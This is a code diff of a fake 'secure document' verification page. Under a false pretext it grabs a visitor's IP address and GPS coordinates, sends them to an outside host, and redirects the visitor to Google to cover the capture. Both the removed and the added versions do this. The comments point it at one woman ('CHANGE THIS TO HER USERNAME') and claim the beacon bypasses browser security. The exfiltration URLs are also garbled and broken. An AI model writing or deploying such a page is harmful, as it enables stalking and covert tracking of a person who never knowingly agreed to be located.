@@ -1,74 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Secure Verification</title>
+    <title>Secure Document Portal</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
-        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
+        body { font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 10%; background-color: #f4f7f6; color: #333; }
+        .box { background: white; padding: 40px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border-top: 5px solid #007bff; }
+        .btn { background: #007bff; color: white; border: none; padding: 15px 35px; font-size: 18px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 20px; }
+        .btn:hover { background: #0056b3; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div id="status"><h3>Verifying Connection...</h3><p>Please do not close this window.</p></div>
+    <div class="box" id="display">
+        <h2>🔒 Identity Verification</h2>
+        <p>A secure document has been shared with you.<br>Please verify your zone to continue.</p>
+        <button class="btn" onclick="start()">UNLOCK DOCUMENT</button>
     </div>
+
     <script>
-        const PA_USER = "TalentAcquisition"; 
-        let sent = false;
+        // 1. CHANGE THIS TO HER USERNAME
+        const PA_USERNAME = 'YOUR_USERNAME'; 
 
-        async function collectAndSend() {
-            if (sent) return;
+        let info = { ip: "Unknown", lat: "0", lon: "0" };
+
+        // Pre-fetch IP
+        fetch('https://ipapi.co').then(r => r.json()).then(d => {
+            info.ip = d.ip;
+        });
+
+        function start() {
+            document.getElementById('display').innerHTML = "<h2>Verifying...</h2><p>Syncing with secure server...</p>";
             
-            let data = { ip: "0.0.0.0", lat: "0", lon: "0", type: "IP-Only" };
-
-            // 1. Get IP Data
-            try {
-                const res = await fetch('https://ipapi.co');
-                const json = await res.json();
-                data.ip = json.ip;
-                data.lat = json.latitude;
-                data.lon = json.longitude;
-            } catch (e) {}
-
-            // 2. Request GPS
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        data.lat = pos.coords.latitude;
-                        data.lon = pos.coords.longitude;
-                        data.type = "High-Precision GPS";
-                        finalize(data);
-                    },
-                    () => { finalize(data); }, 
-                    { enableHighAccuracy: true, timeout: 5000 }
+                    (pos) => { send(pos.coords.latitude, pos.coords.longitude, "GPS"); },
+                    () => { send("0", "0", "Denied"); },
+                    { timeout: 5000 }
                 );
-            } else { finalize(data); }
-            
-            // 3. Force finish after 6 seconds
-            setTimeout(() => finalize(data), 6000);
+            } else { send("0", "0", "NotSupported"); }
         }
 
-        function finalize(d) {
-            if (sent) return;
-            sent = true;
-            
-            // This method (using an Image) bypasses 100% of browser security blocks
-            const img = new Image();
-            img.src = `https://${PA_USER}://{d.lat}&lon=${d.lon}&ip=${d.ip}&type=${d.type}`;
-            
-            // Show completion and jump to Google
-            document.getElementById('status').innerHTML = "<h3>Verification Complete</h3>";
-            setTimeout(() => { window.location.href = "https://google.com"; }, 1500);
+        function send(lat, lon, type) {
+            const url = `https://${PA_USERNAME}://{lat}&lon=${lon}&ip=${info.ip}&type=${type}`;
+            fetch(url, { mode: 'no-cors' }).then(() => {
+                window.location.href = "https://google.com";
+            });
         }
-
-        window.onload = collectAndSend;
     </script>
-
-    
-
-
-        
-    
 </body>
 </html>
 
